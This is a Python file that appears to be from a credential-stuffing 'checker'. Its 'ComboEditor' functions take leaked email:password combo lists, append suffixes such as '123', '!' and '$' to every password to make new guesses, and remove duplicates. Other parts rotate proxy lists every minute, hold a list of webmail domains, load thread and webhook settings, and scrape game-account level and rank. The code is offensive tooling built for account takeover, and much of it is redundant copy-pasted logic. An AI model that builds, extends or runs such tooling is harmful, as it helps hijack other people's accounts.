        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/MinecraftEdits{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                pw1 = '123'
                v = 1
                spilited = line.split(':')
                if ':' in line:
                    if v == 1:
                        t = spilited[1] + str(pw1)
                    else:
                        t = spilited[1] + str(pw1)
                    t = t.replace('\n', '')
                    email = spilited[1].replace('\n', '')
                    out_file.write(spilited[0] + ':' + t + '\n')
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                        w = line.replace('\n', '')
            unedited = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
            edited = open(f'Results/General{self.created}.txt', 'r',
                          encoding='u8', errors='ignore').read().split('\n')
            print(f'{Fore.CYAN}[ComboEditor] Editing\n')
            self.general5()

    def general5(self):
        system('cls')
        print(self.t)
        print(f'{Fore.CYAN}[ComboEditor] Editing...')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/General{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                pw1 = '1'
                v = 1
                spilited = line.split(':')
                if ':' in line:
                    if v == 1:
                        t = spilited[1] + str(pw1)
                    else:
                        t = spilited[1] + str(pw1)
                    t = t.replace('\n', '')
                    email = spilited[1].replace('\n', '')
                    out_file.write(spilited[0] + ':' + t + '\n')
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                        w = line.replace('\n', '')
            unedited = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
            edited = open(f'Results/General{self.created}.txt', 'r',
                          encoding='u8', errors='ignore').read().split('\n')
            print(f'{Fore.CYAN}[ComboEditor] Editing\n')
            self.general6()

    def general6(self):
        system('cls')
        print(self.t)
        print(f'{Fore.CYAN}[ComboEditor] Editing...')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/General{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                pw1 = '$'
                v = 1
                spilited = line.split(':')
                if ':' in line:
                    if v == 1:
                        t = spilited[1] + str(pw1)
                    else:
                        t = spilited[1] + str(pw1)
                    t = t.replace('\n', '')
                    email = spilited[1].replace('\n', '')
                    out_file.write(spilited[0] + ':' + t + '\n')
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                        w = line.replace('\n', '')
            unedited = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
            edited = open(f'Results/General{self.created}.txt', 'r',
                          encoding='u8', errors='ignore').read().split('\n')
            print(f'{Fore.CYAN}[ComboEditor] Editing\n')
            self.general()

    def general(self):
        system('cls')
        print(self.t)
        print(f'{Fore.CYAN}[ComboEditor] Editing...')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/General{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                pw1 = '!'
                v = 1
                spilited = line.split(':')
                if ':' in line:
                    if v == 1:
                        t = spilited[1] + str(pw1)
                    else:
                        t = spilited[1] + str(pw1)
                    t = t.replace('\n', '')
                    email = spilited[1].replace('\n', '')
                    out_file.write(spilited[0] + ':' + t + '\n')
                    out_file.write(line)
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                        w = line.replace('\n', '')
            unedited = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
            edited = open(f'Results/General{self.created}.txt', 'r',
                          encoding='u8', errors='ignore').read().split('\n')
            print(
                f'{Fore.CYAN}[ComboEditor] Done Editing, Made {len(edited)} Combos from {len(unedited)} Combos')
            input(
                f'{Fore.CYAN}[ComboEditor] Press ENTER to remove duplicates and randomize lines')
            with open(f'Results/General{self.created}.txt', 'r+', encoding='latin-1') as self.lines1:
                self.generaldup()

    def generaldup(self):
        output_file: str = f'Results/General_cleaned{self.unix}.txt'
        open(output_file, 'w', encoding='latin-1').writelines(
            set(self.lines1.readlines()))
        print(
            f'{Fore.CYAN}[ComboEditor] Removed Duplicates, Saved in {output_file}')
        afterremove = open(output_file, 'r', encoding='u8',
                           errors='ignore').read().split('\n')
        beforeremove = open(
            f'Results/General{self.created}.txt', 'r', encoding='u8', errors='ignore').read().split('\n')
        print(
            f'{Fore.CYAN}[ComboEditor] Before: {len(beforeremove)} After: {len(afterremove)}\n')
        input(f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
        system('cls')
        Main()

    def password1(self):
        system('cls')
        print(self.t)
        print(f'{Fore.CYAN}[ComboEditor] Editing...')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/MinecraftEdits{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                pw1 = '?'
                v = 1
                spilited = line.split(':')
                if ':' in line:
                    if v == 1:
                        t = spilited[1] + str(pw1)
                    else:
                        t = spilited[1] + str(pw1)
                    t = t.replace('\n', '')
                    email = spilited[1].replace('\n', '')
                    out_file.write(spilited[0] + ':' + t + '\n')
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                        w = line.replace('\n', '')
            unedited = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
            edited = open(f'Results/MinecraftEdits{self.created}.txt',
                          'r', encoding='u8', errors='ignore').read().split('\n')
            print(f'{Fore.CYAN}[ComboEditor] Editing\n')
            self.password2()

    def password2(self):
        system('cls')
        print(self.t)
        print(f'{Fore.CYAN}[ComboEditor] Editing...')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/MinecraftEdits{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                pw1 = '$'
                v = 1
                spilited = line.split(':')
                if ':' in line:
                    if v == 1:
                        t = spilited[1] + str(pw1)
                    else:
                        t = spilited[1] + str(pw1)
                    t = t.replace('\n', '')
                    email = spilited[1].replace('\n', '')
                    out_file.write(spilited[0] + ':' + t + '\n')
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                        w = line.replace('\n', '')
            unedited = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
            edited = open(f'Results/MinecraftEdits{self.created}.txt',
                          'r', encoding='u8', errors='ignore').read().split('\n')
            print(f'{Fore.CYAN}[ComboEditor] Editing\n')
            self.password3()

    def password3(self):
        system('cls')
        print(self.t)
        print(f'{Fore.CYAN}[ComboEditor] Editing...')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/MinecraftEdits{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                pw1 = '%'
                v = 1
                spilited = line.split(':')
                if ':' in line:
                    if v == 1:
                        t = spilited[1] + str(pw1)
                    else:
                        t = spilited[1] + str(pw1)
                    t = t.replace('\n', '')
                    email = spilited[1].replace('\n', '')
                    out_file.write(spilited[0] + ':' + t + '\n')
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                        w = line.replace('\n', '')
            unedited = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
            edited = open(f'Results/MinecraftEdits{self.created}.txt',
                          'r', encoding='u8', errors='ignore').read().split('\n')
            print(f'{Fore.CYAN}[ComboEditor] Editing\n')
            self.password4()

    def password4(self):
        system('cls')
        print(self.t)
        print(f'{Fore.CYAN}[ComboEditor] Editing...')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/MinecraftEdits{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                pw1 = '123'
                v = 1
                spilited = line.split(':')
                if ':' in line:
                    if v == 1:
                        t = spilited[1] + str(pw1)
                    else:
                        t = spilited[1] + str(pw1)
                    t = t.replace('\n', '')
                    email = spilited[1].replace('\n', '')
                    out_file.write(spilited[0] + ':' + t + '\n')
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                        w = line.replace('\n', '')
            unedited = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
            edited = open(f'Results/MinecraftEdits{self.created}.txt',
                          'r', encoding='u8', errors='ignore').read().split('\n')
            print(f'{Fore.CYAN}[ComboEditor] Editing\n')
            self.password5()

    def password5(self):
        system('cls')
        print(self.t)
        print(f'{Fore.CYAN}[ComboEditor] Editing...')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/MinecraftEdits{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                pw1 = '1'
                v = 1
                spilited = line.split(':')
                if ':' in line:
                    if v == 1:
                        t = spilited[1] + str(pw1)
                    else:
                        t = spilited[1] + str(pw1)
                    t = t.replace('\n', '')
                    email = spilited[1].replace('\n', '')
                    out_file.write(spilited[0] + ':' + t + '\n')
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                        w = line.replace('\n', '')
            unedited = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
            edited = open(f'Results/MinecraftEdits{self.created}.txt',
                          'r', encoding='u8', errors='ignore').read().split('\n')
            print(f'{Fore.CYAN}[ComboEditor] Editing\n')
            self.password()

    def password(self):
        system('cls')
        print(self.t)
        print(f'{Fore.CYAN}[ComboEditor] Editing...')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/MinecraftEdits{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                pw1 = '!'
                v = 1
                spilited = line.split(':')
                if ':' in line:
                    if v == 1:
                        t = spilited[1] + str(pw1)
                    else:
                        t = spilited[1] + str(pw1)
                    t = t.replace('\n', '')
                    email = spilited[1].replace('\n', '')
                    out_file.write(spilited[0] + ':' + t + '\n')
                    out_file.write(line)
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                        w = line.replace('\n', '')
            unedited = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
            edited = open(f'Results/MinecraftEdits{self.created}.txt',
                          'r', encoding='u8', errors='ignore').read().split('\n')
            print(
                f'{Fore.CYAN}[ComboEditor] Done Editing, Made {len(edited)} Combos from {len(unedited)} Combos')
            input(
                f'{Fore.CYAN}[ComboEditor] Press ENTER to remove duplicates and randomize lines')
            with open(f'Results/MinecraftEdits{self.created}.txt', 'r+', encoding='latin-1') as self.lines1:
                self.sort1()

    def sort1(self):
        output_file: str = f'Results/MinecraftEditsCleaned{self.unix}.txt'
        open(output_file, 'w', encoding='latin-1').writelines(
            set(self.lines1.readlines()))
        print(
            f'{Fore.CYAN}[ComboEditor] Removed Duplicates, Saved in {output_file}')
        afterremove = open(output_file, 'r', encoding='u8',
                           errors='ignore').read().split('\n')
        beforeremove = open(
            f'Results/MinecraftEdits{self.created}.txt', 'r', encoding='u8', errors='ignore').read().split('\n')
        print(
            f'{Fore.CYAN}[ComboEditor] Before: {len(beforeremove)} After: {len(afterremove)}\n')
        input(f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
        system('cls')
        Main()


    def proxyupdateder(self):
        while True:
            if not self.proxyapi:
                read_files = glob('proxies/*.txt')
                self.proxylist = []
                for file in read_files:
                    proxylistt = open(file, 'r', encoding='u8',
                                      errors='ignore').read().split('\n')
                    for line in proxylistt:
                        self.proxylist.append(f'{line}')
                    print(
                        f'{Fore.CYAN}[Proxy] Proxies Refreshed there are now {len(self.proxylist)}')
                    sleep(60)
                    continue

    @staticmethod
    def lisr():
        lisr = ['@gmail.com', '@yahoo.com', '@hotmail.com', '@aol.com', '@hotmail.co.uk', '@hotmail.fr', '@msn.com',
                '@yahoo.fr', '@wanadoo.fr', '@orange.fr', '@comcast.net', '@yahoo.co.uk', '@yahoo.com.br',
                '@yahoo.co.in', '@live.com', '@rediffmail.com', '@free.fr', '@gmx.de', '@web.de', '@yandex.ru',
                '@ymail.com', '@libero.it', '@outlook.com', '@uol.com.br', '@bol.com.br', '@mail.ru', '@cox.net',
                '@hotmail.it', '@sbcglobal.net', '@sfr.fr', '@live.fr', '@verizon.net', '@live.co.uk',
                '@googlemail.com', '@yahoo.es', '@ig.com.br', '@live.nl', '@bigpond.com', '@terra.com.br', '@yahoo.it',
                '@neuf.fr', '@yahoo.de', '@alice.it', '@rocketmail.com', '@att.net', '@laposte.net', '@facebook.com',
                '@bellsouth.net', '@yahoo.in', '@hotmail.es', '@charter.net', '@yahoo.ca', '@yahoo.com.au',
                '@rambler.ru', '@hotmail.de', '@tiscali.it', '@shaw.ca0.1%', '@yahoo.co.jp', '@sky.com',
                '@earthlink.net', '@optonline.net', '@freenet.de', '@t-online.de', '@aliceadsl.fr', '@virgilio.it',
                '@home.nl', '@qq.com', '@telenet.be', '@me.com', '@yahoo.com.ar', '@tiscali.co.uk', '@yahoo.com.mx',
                '@voila.fr', '@gmx.net', '@mail.com', '@planet.nl', '@tin.it', '@live.it', '@ntlworld.com', '@arcor.de',
                '@yahoo.co.id', '@frontiernet.net', '@hetnet.nl', '@live.com.au', '@yahoo.com.sg', '@zonnet.nl',
                '@club-internet.fr', '@juno.com', '@optusnet.com.au', '@blueyonder.co.uk', '@bluewin.ch', '@skynet.be',
                '@sympatico.ca', '@windstream.net', '@mac.com', '@centurytel.net', '@chello.nl', '@live.ca', '@aim.com',
                '@bigpond.net.au']
        return lisr

    def scrambled(self, ob):
        dest = ob[:]
        shuffle(dest)
        return dest


class Checker:

    try:
        printbadd = bool(config['checker']['print_fail'])
        retries = int(config['checker']['retries'])
        timeout = int(config['checker']['timeout']) / 1000
        threads = int(config['checker']['threads'])
        save_bad = bool(config['checker']['save_bad'])
        debug = bool(config['checker']['debugging'])


        class webhook:
            webhooky = bool(config['checker']['webhook']['Webhook'])
            webhookid = str(config['checker']['webhook']['WebhookID'])


        class Proxy:
            proxy = bool(config['checker']['proxy']['proxy'])
            type = str(config['checker']['proxy']['proxy_type'])
            proxy_api = bool(config['checker']['proxy']['proxy_api'])
            proxy_api_link = str(config['checker']['proxy']['api_link'])

    except KeyError:
        print(f'{Fore.CYAN}Config is outdated, deleting...')
        os.remove('config/config.yml')
        os.rmdir('config')
        print(f'{Fore.GREEN}Deleted')
        print(f'{Fore.CYAN}Please restart the checker\n')
        exit()


if __name__ == '__main__':
    agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36'
    from glob import glob
    from re import findall
    from threading import Thread, Lock
    lock = Lock()
    levelmp = compilee(r'>Level (.*)</b>')
    rankmp = compilee(r'class=\"www-mp-rank\".*>(.*)</span>')
    something = compilee(r'class=\"stat-value \".*>(.*)</span>')
    Main()
